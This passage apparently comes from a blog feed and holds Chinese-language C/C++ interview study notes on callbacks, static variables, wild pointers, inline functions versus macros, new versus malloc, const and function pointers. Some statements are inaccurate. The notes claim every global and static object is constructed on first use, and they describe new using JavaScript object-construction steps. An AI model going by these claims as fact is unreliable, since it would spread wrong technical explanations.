class="comment">//第三个是size_t类型，代表单个数据占用空间大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">           <span class="keyword">int</span>(*compar)(<span class="keyword">const</span> <span class="keyword">void</span> *,<span class="keyword">const</span> <span class="keyword">void</span> *)<span class="comment">//第四个参数是函数指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">          )</span></span>;</span><br><span class="line"><span class="comment">//第四个参数告诉qsort，应该使用哪个函数来比较元素，即只要我们告诉qsort比较大小的规则，它就可以帮我们对任意数据类型的数组进行排序。在库函数qsort调用我们自定义的比较函数，这就是回调的应用。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//示例</span></span><br><span class="line"><span class="keyword">int</span> num[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp_int</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* _a , <span class="keyword">const</span> <span class="keyword">void</span>* _b)</span></span>&#123;<span class="comment">//参数格式固定</span></span><br><span class="line">    <span class="keyword">int</span>* a = (<span class="keyword">int</span>*)_a;    <span class="comment">//强制类型转换</span></span><br><span class="line">    <span class="keyword">int</span>* b = (<span class="keyword">int</span>*)_b;</span><br><span class="line">    <span class="keyword">return</span> *a - *b;　　</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">qsort</span>(num,<span class="number">100</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(num[<span class="number">0</span>]),cmp_int); <span class="comment">//回调</span></span><br></pre></td></tr></table></figure><h2 id="说说静态变量什么时候初始化"><a href="#说说静态变量什么时候初始化" class="headerlink" title="说说静态变量什么时候初始化"></a>说说静态变量什么时候初始化</h2><blockquote><p>对于C语言的全局和静态变量，初始化发生在任何代码执行之前，属于<font color="#FF00FF">编译期初始化</font>。而C++标准规定：<font color="#FF00FF">全局或静态对象当且仅当对象首次用到时才进行构造</font>。</p></blockquote><ol><li>作用域：C++里作用域可分为6种：全局，局部，类，语句，命名空间和文件作用域。<pre><code> - 静态全局变量 ：全局作用域+文件作用域，所以无法在其他文件中使用。 - &lt;font color=&quot;#FF8C00&quot;&gt;静态局部变量 ：局部作用域，只被初始化一次，直到程序结束。&lt;/font&gt; - 类静态成员变量：类作用域。</code></pre></li><li>所在空间：都在静态存储区。<font color="#FF8C00">因为静态变量都在静态存储区，所以下次调用函数的时候还是能取到原来的值。</font></li><li>生命周期：静态全局变量、静态局部变量都在静态存储区，直到程序结束才会回收内存。类静态成员变量在静态存储区，当超出类作用域时回收内存。</li></ol><h2 id="nullptr调用成员函数可以吗？为什么？"><a href="#nullptr调用成员函数可以吗？为什么？" class="headerlink" title="nullptr调用成员函数可以吗？为什么？"></a>nullptr调用成员函数可以吗？为什么？</h2><p>能。原因：<font color="#FF8C00">因为在编译时对象就绑定了函数地址，和指针空不空没关系。</font></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//给出实例</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">animal</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span></span>&#123; cout &lt;&lt; <span class="string">&quot;animal sleep&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">breathe</span><span class="params">()</span></span>&#123; cout &lt;&lt; <span class="string">&quot;animal breathe haha&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fish</span> :</span><span class="keyword">public</span> animal&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">breathe</span><span class="params">()</span></span>&#123; cout &lt;&lt; <span class="string">&quot;fish bubble&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    animal *pAn=<span class="literal">nullptr</span>;</span><br><span class="line">    pAn-&gt;<span class="built_in">breathe</span>();   <span class="comment">// 输出：animal breathe haha</span></span><br><span class="line">    fish *pFish = <span class="literal">nullptr</span>;</span><br><span class="line">    pFish-&gt;<span class="built_in">breathe</span>(); <span class="comment">// 输出：fish bubble</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>原因：因为在编译时对象就绑定了函数地址，和指针空不空没关系。pAn-&gt;breathe();编译的时候，函数的地址就和指针pAn绑定了；<font color="#FF00FF">调用breath(*this), this就等于pAn</font>。<font color="#228B22">由于函数中没有需要解引用this的地方，所以函数运行不会出错，但是若用到this，因为this=nullptr，运行出错。</font></p><h2 id="说说什么是野指针，怎么产生的，如何避免？"><a href="#说说什么是野指针，怎么产生的，如何避免？" class="headerlink" title="说说什么是野指针，怎么产生的，如何避免？"></a>说说什么是<a href="https://www.cnblogs.com/idorax/p/6475941.html">野指针</a>，怎么产生的，如何避免？</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>野指针就是指针指向的位置是不可知的（随机的、不正确的、没有明确限制的）<br>野指针是指针没有初始化，悬空指针是指针指向的内存已被释放。</p><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><p><font color="#FF8C00">释放内存后指针不及时置空（野指针），依然指向了该内存</font>，那么可能出现非法访问的错误。这些我们都要注意避免。</p><h3 id="避免办法"><a href="#避免办法" class="headerlink" title="避免办法"></a><font color="#FF8C00">避免办法</font></h3><p>（1）初始化置NULL<br>（2）申请内存后判空<br>（3）指针释放后置NULL<br>（4）使用智能指针</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//产生原因</span></span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">char</span>)*<span class="number">100</span>);  </span><br><span class="line"><span class="built_in">strcpy</span>(p, <span class="string">&quot;Douya&quot;</span>);  </span><br><span class="line"><span class="built_in">free</span>(p);<span class="comment">//p所指向的内存被释放，但是p所指的地址仍然不变  </span></span><br><span class="line">...  </span><br><span class="line"><span class="keyword">if</span> (p != <span class="literal">NULL</span>)&#123;<span class="comment">//没有起到防错作用  </span></span><br><span class="line">    <span class="built_in">strcpy</span>(p, <span class="string">&quot;hello, Douya!&quot;</span>);<span class="comment">//出错  </span></span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p><strong>避免办法：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//避免方法</span></span><br><span class="line"><span class="keyword">int</span> *p = <span class="literal">NULL</span>; <span class="comment">//初始化置NULL</span></span><br><span class="line">p = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*n); <span class="comment">//申请n个int内存空间  </span></span><br><span class="line"><span class="built_in">assert</span>(p != <span class="literal">NULL</span>); <span class="comment">//判空，防错设计</span></span><br><span class="line">p = (<span class="keyword">int</span> *) <span class="built_in">realloc</span>(p, <span class="number">25</span>);<span class="comment">//重新分配内存, p 所指向的内存块会被释放并分配一个新的内存地址</span></span><br><span class="line"><span class="built_in">free</span>(p);  </span><br><span class="line">p = <span class="literal">NULL</span>; <span class="comment">//释放后置空</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> *p1 = <span class="literal">NULL</span>; <span class="comment">//初始化置NULL</span></span><br><span class="line">p1 = (<span class="keyword">int</span> *)<span class="built_in">calloc</span>(n, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)); <span class="comment">//申请n个int内存空间同时初始化为0 </span></span><br><span class="line"><span class="built_in">assert</span>(p1 != <span class="literal">NULL</span>); <span class="comment">//判空，防错设计</span></span><br><span class="line"><span class="built_in">free</span>(p1);  </span><br><span class="line">p1 = <span class="literal">NULL</span>; <span class="comment">//释放后置空</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> *p2 = <span class="literal">NULL</span>; <span class="comment">//初始化置NULL</span></span><br><span class="line">p2 = <span class="keyword">new</span> <span class="keyword">int</span>[n]; <span class="comment">//申请n个int内存空间  </span></span><br><span class="line"><span class="built_in">assert</span>(p2 != <span class="literal">NULL</span>); <span class="comment">//判空，防错设计</span></span><br><span class="line"><span class="keyword">delete</span> []p2;  </span><br><span class="line">p2 = <span class="literal">nullptr</span>; <span class="comment">//释放后置空  </span></span><br></pre></td></tr></table></figure><h2 id="说说静态局部变量，全局变量，局部变量的特点，以及使用场景"><a href="#说说静态局部变量，全局变量，局部变量的特点，以及使用场景" class="headerlink" title="说说静态局部变量，全局变量，局部变量的特点，以及使用场景"></a>说说静态局部变量，全局变量，局部变量的特点，以及使用场景</h2><h3 id="首先从作用域考虑"><a href="#首先从作用域考虑" class="headerlink" title="首先从作用域考虑"></a>首先从作用域考虑</h3><blockquote><p>C++里作用域可分为6种：全局，局部，类，语句，命名空间和文件作用域。</p></blockquote><p>全局变量：全局作用域，可以通过extern作用于其他非定义的源文件。<br>静态全局变量 ：全局作用域+文件作用域，所以无法在其他文件中使用。<br>局部变量：局部作用域，比如函数的参数，函数内的局部变量等等。<br><font color="#FF8C00">静态局部变量 ：局部作用域，只被初始化一次，直到程序结束。</font></p><h3 id="从所在空间考虑"><a href="#从所在空间考虑" class="headerlink" title="从所在空间考虑"></a>从所在空间考虑</h3><p><font color="#FF00FF">除了局部变量在栈上外</font>，其他都在静态存储区。因为静态变量都在静态存储区，<font color="#FF00FF">所以下次调用函数的时候还是能取到原来的值。</font></p><h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><p>局部变量在栈上，出了作用域就回收内存；而全局变量、静态全局变量、静态局部变量都在静态存储区，直到程序结束才会回收内存。</p><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>从它们各自特点就可以看出各自的应用场景，不再赘述。</p><h2 id="说说内联函数和宏函数的区别"><a href="#说说内联函数和宏函数的区别" class="headerlink" title="说说内联函数和宏函数的区别"></a>说说内联函数和宏函数的区别</h2><h3 id="区别-2"><a href="#区别-2" class="headerlink" title="区别"></a>区别</h3><ol><li><font color="#FF8C00">宏定义不是函数</font>，但是使用起来像函数。<font color="#FF00FF">预处理器用复制宏代码的方式代替函数的调用</font>，省去了函数压栈退栈过程，提高了效率；而内联函数本质上是一个函数，内联函数一般用于函数体的代码比较简单的函数，<font color="#FF8C00">不能包含复杂的控制语句，while、switch，并且内联函数本身不能直接调用自身。</font></li><li>宏函数是<font color="#FF00FF">在预编译的时候把所有的宏名用宏体来替</font>换，简单的说就是字符串替换 ；而<font color="#FF8C00">内联函数则是在编译的时候进行代码插入</font>，编译器会在每处调用内联函数的地方直接把内联函数的内容展开，这样可以省去函数的调用的开销，提高效率</li><li>宏定义是<font color="#FF00FF">没有类型检查的</font>，无论对还是错都是直接替换；而<font color="#FF00FF">内联函数在编译的时候会进行类型的检查</font>，内联函数满足函数的性质，比如有返回值、参数列表等</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//宏定义示例</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX(a, b) ((a)&gt;(b)?(a):(b))</span></span><br><span class="line"><span class="built_in">MAX</span>(a, <span class="string">&quot;Hello&quot;</span>); <span class="comment">//错误地比较int和字符串，没有参数类型检查</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//内联函数示例</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (a + b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    a = <span class="built_in">add</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a+b=%d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//以上a = add(1, 2);处在编译时将被展开为：a = (a + b);</span></span><br></pre></td></tr></table></figure><h3 id="使用时的一些注意事项"><a href="#使用时的一些注意事项" class="headerlink" title="使用时的一些注意事项"></a>使用时的一些注意事项</h3><ol><li>使用宏定义一定要注意错误情况的出现，比如宏定义函数没有类型检查，可能传进来任意类型，从而带来错误，如举例。还有就是括号的使用，宏在定义时要小心处理宏参数，一般用括号括起来，否则容易出现二义性</li><li>inline函数一般用于比较小的，频繁调用的函数，这样可以减少函数调用带来的开销。只需要在函数返回类型前加上关键字inline，即可将函数指定为inline函数。</li><li>同其它函数不同的是，最好将inline函数定义在头文件，而不仅仅是声明<font color="#FF8C00">，因为编译器在处理inline函数时，需要在调用点内联展开该函数，所以仅需要函数声明是不够的。</font></li></ol><h3 id="内联函数使用的条件"><a href="#内联函数使用的条件" class="headerlink" title="内联函数使用的条件"></a>内联函数使用的条件</h3><p>内联是以代码膨胀（复制）为代价，仅仅省去了函数调用的开销，从而提高函数的执行效率。如果执行函数体内代码的时间，相比于函数调用的开销较大，那么效率 的收获会很少。另一方面，每一处内联函数的调用都要复制代码，将使程序的总代码量增大，消耗更多的内存空间。以下情况不宜使用内联：<br>（1）如果函数体内的代码比较长，使用内联将导致内存消耗代价较高。<br>（2）如果函数体内出现循环，那么执行函数体内代码的时间要比函数调用的开销大。</p><p><em>内联不是什么时候都能展开的，一个好的编译器将会根据函数的定义体，自动地取消不符合要求的内联</em></p><h2 id="说说运算符i-和-i的区别"><a href="#说说运算符i-和-i的区别" class="headerlink" title="说说运算符i ++ 和 ++ i的区别"></a>说说运算符i ++ 和 ++ i的区别</h2><ol><li>赋值顺序不同：++ i 是先加后赋值；i ++ 是先赋值后加；++i和i++都是分两步完成的。</li><li><font color="#FF00FF">效率不同</font>：后置++执行速度比前置的慢。</li><li>i++ 不能作为左值，而++i 可以：</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span>* p1 = &amp;(++i);<span class="comment">//正确</span></span><br><span class="line"><span class="comment">// int* p2 = &amp;(i++);//错误</span></span><br><span class="line">++i = <span class="number">1</span>;<span class="comment">//正确</span></span><br><span class="line"><span class="comment">// i++ = 1;//错误</span></span><br></pre></td></tr></table></figure><ol start="4"><li>两者都不是原子操作。</li></ol><h2 id="说说new和malloc的区别，各自底层实现原理"><a href="#说说new和malloc的区别，各自底层实现原理" class="headerlink" title="说说new和malloc的区别，各自底层实现原理"></a><font color="#FF8C00">说说new和malloc的区别，各自底层实现原理</font></h2><h3 id="区别-3"><a href="#区别-3" class="headerlink" title="区别"></a>区别</h3><ol><li>new是操作符，而malloc是函数。</li><li><font color="#FF00FF">new在调用的时候先分配内存，在调用构造函数，释放的时候调用析构函数</font>；而malloc没有构造函数和析构函数。</li><li>malloc需要给定申请内存的大小，返回的指针需要强转；new会调用构造函数，不用指定内存的大小，返回指针不用强转。</li><li>new可以被重载；malloc不行</li><li>new分配内存更直接和安全。</li><li><font color="#FF00FF">new发生错误抛出异常，malloc返回null</font></li></ol><h3 id="底层原理"><a href="#底层原理" class="headerlink" title="底层原理"></a>底层原理</h3><p><strong>malloc底层实现</strong>：<font color="#FF00FF">当开辟的空间小于 128K 时，调用 brk（）函数；当开辟的空间大于 128K 时，调用mmap（）。malloc采用的是内存池的管理方式，以减少内存碎片。先申请大块内存作为堆区，然后将堆区分为多个内存块。当用户申请内存时，直接从堆区分配一块合适的空闲快。采用隐式链表将所有空闲块，每一个空闲块记录了一个未分配的、连续的内存地址。</font></p><p><strong>new底层实现</strong>：关键字new在调用构造函数的时候实际上进行了如下的几个步骤：</p><ol><li>创建一个新的对象</li><li>将构造函数的作用域赋值给这个新的对象（因此this指向了这个新的对象）</li><li>执行构造函数中的代码（为这个新对象添加属性）</li><li>返回新对象</li></ol><h2 id="说说const和define的区别"><a href="#说说const和define的区别" class="headerlink" title="说说const和define的区别"></a>说说const和define的区别</h2><p>const用于定义常量；<font color="#FF8C00">而define用于定义宏，而宏也可以用于定义常量</font>。都用于常量定义时，它们的区别有：</p><ol><li><font color="#FF8C00">const生效于编译的阶段；define生效于预处理阶段。</font></li><li><font color="#FF8C00">const定义的常量，在C语言中是存储在内存中、需要额外的内存空间的；define定义的常量，运行时是直接的操作数，并不会存放在内存中。</font></li><li>const定义的常量是带类型的；define定义的常量不带类型。因此<font color="#FF00FF">define定义的常量不利于类型检查。</font></li></ol><h2 id="说说C-中函数指针和指针函数的区别"><a href="#说说C-中函数指针和指针函数的区别" class="headerlink" title="说说C++中函数指针和指针函数的区别"></a>说说C++中函数指针和指针函数的区别</h2><p><strong>定义不同</strong> 指针函数本质是一个函数，其返回值为指针。 函数指针本质是一个指针，其指向一个函数。<br><strong>写法不同</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">指针函数：<span class="function"><span class="keyword">int</span> *<span class="title">fun</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>;</span><br><span class="line">函数指针：<span class="built_in"><span class="keyword">int</span></span> (*fun)(<span class="keyword">int</span> x,<span class="keyword">int</span> y);</span><br></pre></td></tr></table></figure><p><strong>用法不同</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//指针函数示例</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">Data</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">&#125;Data;</span><br><span class="line"><span class="comment">//指针函数</span></span><br><span class="line"><span class="function">Data* <span class="title">f</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    Data * data = <span class="keyword">new</span> Data;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//调用指针函数</span></span><br><span class="line">    Data * myData = <span class="built_in">f</span>(<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="comment">//Data * myData = static_cast&lt;Data*&gt;(f(4,5));</span></span><br><span class="line">   <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数指针示例</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//函数指针</span></span><br><span class="line"><span class="built_in"><span class="keyword">int</span></span> (*fun)(<span class="keyword">int</span> x,<span class="keyword">int</span> y);</span><br><span class="line"><span class="comment">//赋值</span></span><br><span class="line">fun = add;</span><br><span class="line"><span class="comment">//调用</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;(*fun)(1,2) = &quot;</span> &lt;&lt; (*fun)(<span class="number">1</span>,<span class="number">2</span>) ;</span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line"><span class="comment">//(*fun)(1,2) =  3</span></span><br></pre></td></tr></table></figure><h2 id="说说const-int-a-int-const-a-const-int-a-int-const-a-const-int-const-a分别是什么，有什么特点。"><a href="#说说const-int-a-int-const-a-const-int-a-int-const-a-const-int-const-a分别是什么，有什么特点。" class="headerlink" title="说说const int *a, int const *a, const int a, int *const a, const int *const a分别是什么，有什么特点。"></a>说说const int *a, int const *a, const int a, int *const a, const int *const a分别是什么，有什么特点。</h2><ol><li>const int a;     //指的是a是一个常量，不允许修改。</li><li>const int <em>a;    //a指针所指向的内存里的值不变，即（</em>a）不变</li><li>int const *a;    //同const int *a;</li><li>int *const a;    //a指针所指向的内存地址不变，即a不变</li><li><font color="#FF00FF">const int <em>const a;   //都不变，即（</em>a）不变，a也不变</font></li></ol><h2 id="说说使用指针需要注意什么"><a href="#说说使用指针需要注意什么" class="headerlink" title="说说使用指针需要注意什么"></a>说说使用指针需要注意什么</h2><ol><li>定义指针时，先初始化为NULL。</li><li>用malloc或new申请内存之后，应该立即检查指针值是否为NULL。<font color="#FF00FF">防止使用指针值为NULL的内存</font>。</li><li><font color="#FF8C00">不要忘记为数组和动态内存赋初值。防止将未被初始化的内存作为右值使用</font>。</li><li>避免数字或指针的<font color="#FF00FF">下标越界</font>，特别要当心发生“多1”或者“少1”操作</li><li>动态内存的申请与释放必须配对，防止内存泄漏</li><li>用free或delete释放了内存之后，立即将指针设置为NULL，防止“野指针”</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *p = <span class="literal">NULL</span>; <span class="comment">//初始化置NULL</span></span><br><span class="line">p = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*n); <span class="comment">//申请n个int内存空间  </span></span><br><span class="line"><span class="built_in">assert</span>(p != <span class="literal">NULL</span>); <span class="comment">//判空，防错设计</span></span><br><span class="line">p = (<span class="keyword">int</span> *) <span class="built_in">realloc</span>(p, <span class="number">25</span>);<span class="comment">//重新分配内存, p 所指向的内存块会被释放并分配一个新的内存地址</span></span><br><span class="line"><span class="built_in">free</span>(p);  </span><br><span class="line">p = <span class="literal">NULL</span>; <span class="comment">//释放后置空</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> *p1 = <span class="literal">NULL</span>; <span class="comment">//初始化置NULL</span></span><br><span class="line">p1 = (<span class="keyword">int</span> *)<span class="built_in">calloc</span>(n, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)); <span class="comment">//申请n个int内存空间同时初始化为0 </span></span><br><span class="line"><span class="built_in">assert</span>(p1 != <span class="literal">NULL</span>); <span class="comment">//判空，防错设计</span></span><br><span class="line"><span class="built_in">free</span>(p1);  </span><br><span class="line">p1 = <span class="literal">NULL</span>; <span class="comment">//释放后置空</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> *p2 = <span class="literal">NULL</span>; <span class="comment">//初始化置NULL</span></span><br><span class="line">p2 = <span class="keyword">new</span> <span class="keyword">int</span>[n]; <span class="comment">//申请n个int内存空间  </span></span><br><span class="line"><span class="built_in">assert</span>(p2 != <span class="literal">NULL</span>); <span class="comment">//判空，防错设计</span></span><br><span class="line"><span class="keyword">delete</span> []p2;  </span><br><span class="line">p2 = <span class="literal">nullptr</span>; <span class="comment">//释放后置空  </span></span><br></pre></td></tr></table></figure><h2 id="说说内联函数和函数的区别，内联函数的作用"><a href="#说说内联函数和函数的区别，内联函数的作用" class="headerlink" title="说说内联函数和函数的区别，内联函数的作用"></a>说说内联函数和函数的区别，内联函数的作用</h2><h3 id="区别-4"><a href="#区别-4" class="headerlink" title="区别"></a>区别</h3><ol><li>内联函数比普通函数多了关键字inline</li><li>内联函数避免了函数<font color="#FF00FF">调用的开销</font>；普通函数有调用的开销</li><li>普通函数在被调用的时候，需要<font color="#FF00FF">寻址（函数入口地址）</font>；内联函数不需要寻址。</li><li>内联函数有一定的限制，内联函数体要求代码简单，不能包含复杂的结构控制语句；普通函数没有这个要求。</li><li>内联函数的作用：内联函数在调用时，是将调用表达式用内联函数体来替换。避免函数调用的开销。</li></ol><h3 id="内联函数使用的注意事项"><a href="#内联函数使用的注意事项" class="headerlink" title="内联函数使用的注意事项"></a>内联函数使用的注意事项</h3><ol><li>在内联函数内<font color="#FF8C00">不允许用循环语句和开关语句</font>。 如果内联函数有这些语句，则编译将该函数视同普通函数那样产生函数调用代码,递归函数是不能被用来做内联函数的。内联函数只适合于只有1～5行的小函数。对一个含有许多语句的大函数，函数调用和返回的开销相对来说微不足道，所以也没有必要用内联函数实现。</li><li><font color="#FF00FF">内联函数的定义必须出现在内联函数第一次被调用之前</font>。</li></ol><h2 id="简述C-有几种传值方式，之间的区别是什么"><a href="#简述C-有几种传值方式，之间的区别是什么" class="headerlink" title="简述C++有几种传值方式，之间的区别是什么"></a>简述C++有几种传值方式，之间的区别是什么</h2><blockquote><p>传参方式有这三种：<strong>值传递、引用传递、指针传递</strong></p></blockquote><ol><li>值传递：形参即使在函数体内值发生变化，也不会影响实参的值；</li><li>引用传递：形参在函数体内值发生变化，会影响实参的值；</li><li>指针传递：在指针指向没有发生改变的前提下，形参在函数体内值发生变化，会影响实参的值；</li></ol><p><strong>值传递用于对象时，整个对象会拷贝一个副本，这样效率低；而引用传递用于对象时，不发生拷贝行为，只是绑定对象，更高效；指针传递同理，但不如引用传递安全。</strong></p><h2 id="简述const（星号）和（星号）const的区别"><a href="#简述const（星号）和（星号）const的区别" class="headerlink" title="简述const（星号）和（星号）const的区别"></a>简述const（星号）和（星号）const的区别</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//const* 是常量指针，*const 是指针常量</span></span><br><span class="line"><span class="keyword">int</span> <span class="keyword">const</span> *a;    <span class="comment">//a指针所指向的内存里的值不变，即（*a）不变</span></span><br><span class="line"><span class="keyword">int</span> *<span class="keyword">const</span> a;    <span class="comment">//a指针所指向的内存地址不变，即a不变</span></span><br></pre></td></tr></table></figure><p>对于引用：<br>(1)只有一个const，如果const位于&amp;左侧，int const &amp;x /const int &amp;x表示引用所指数据是常量，不能通过引用来修改该数据；底层const。<br>(2)只有一个const，如果const位于&amp;右侧，int &amp; const x，由于int &amp; ref = a，在C++内部会将其转化为int* const ref = &amp;a，已经不变了，再加一个也没啥用吧= =（个人理解）</p>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> study, graduate student,C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>STM32F108的学习</title>
      <link href="/2022/11/11/STM32F108%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/11/11/STM32F108%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
